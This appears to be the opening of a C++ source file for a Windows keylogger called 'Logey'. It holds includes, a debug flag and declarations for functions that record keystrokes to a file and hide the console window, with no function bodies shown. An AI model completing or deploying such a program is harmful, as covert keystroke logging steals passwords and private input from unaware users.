#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <time.h>

using namespace std;

/*
*	Global DEBUG variable
*	If true, the console will be shown and show live output.
*/
bool DEBUG = false;

const double LOGEY_VERSION = 1.04;

void keys(int key, const char *filename);
void hideConsole();
char findLetter(int key);
void createNewInstanceHeader(char *filename);